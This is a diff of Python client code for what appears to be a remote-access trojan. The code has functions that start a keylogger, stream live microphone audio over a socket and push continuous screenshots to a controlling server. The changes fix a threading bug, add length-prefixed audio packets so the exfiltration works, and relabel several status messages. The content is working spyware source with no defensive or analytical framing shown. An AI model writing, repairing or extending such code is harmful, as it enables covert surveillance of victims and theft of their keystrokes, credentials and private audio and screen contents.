@@ -146,7 +146,7 @@ def start_keylogger():
     t = threading.Thread(target=run)
     t.daemon = True  # Set the thread as a daemon so it exits when the main program exits
     t.start()
-    reliable_send("[+] Keylogger started.")
+    reliable_send("[+] Keylogger started. (Client side)")
 
 def stop_keylogger():
     global keylogger_running, log
@@ -154,7 +154,7 @@ def stop_keylogger():
     time.sleep(1)  # Give the keylogger some time to finish capturing keys
     # Clear the log when stopping the keylogger
     log = ""
-    reliable_send("[+] Keylogger stopped.")
+    reliable_send("[+] Keylogger stopped. (Client side)")
 
 def retrieve_keylogger_log():
     global log
@@ -169,9 +169,10 @@ def start_audio_stream():
     global stream_thread, streaming_flag
     if not streaming_flag['on']:
         streaming_flag['on'] = True
-        stream_thread = threading.Thread(target=stream_audio, args=(streaming_flag))
+        stream_thread = threading.Thread(target=stream_audio, args=(streaming_flag,))
         stream_thread.daemon = True  # Set the thread as a daemon so it exits when the main program exits
         stream_thread.start()
+        reliable_send('[+] Audio streaming started. (Client side)')
     else:
         pass
 
@@ -181,9 +182,11 @@ def stop_audio_stream():
     if stream_thread:
         stream_thread.join()  # Wait for the audio thread to finish
         stream_thread = None  # Reset the thread reference
-    reliable_send("[+] Audio stream stopped.")
+        reliable_send('[+] Audio streaming stopped. (Client side)')
+    else:
+        reliable_send('[!] Audio thread is not running. (Client side)')
 
-def stream_audio(sock, flag):
+def stream_audio(flag):
     CHUNK = 1024
     FORMAT = pyaudio.paInt16
     CHANNELS = 1
@@ -198,7 +201,8 @@ def stream_audio(sock, flag):
                         rate=RATE, input=True, frames_per_buffer=CHUNK)
         while flag['on']:
             data = stream.read(CHUNK)
-            sock.sendall(data)
+            packet = len(data).to_bytes(4, 'big') + data 
+            stream_socket.sendall(packet)
     except:
         pass
     finally:
@@ -222,9 +226,9 @@ def start_screen_stream():
         screen_thread = threading.Thread(target=stream_screen)
         screen_thread.daemon = True
         screen_thread.start()
-        reliable_send('[+] Screen streaming started.')
+        reliable_send('[+] Screen streaming started. (Client side)')
     except Exception as e:
-        reliable_send(f'[-] Failed to start screen streaming: {str(e)}')
+        reliable_send(f'[-] Failed to start screen streaming (Client side): {str(e)}')
 
 def stream_screen():
     try: # Runs in a separate thread and continuously sends screenshots to the server
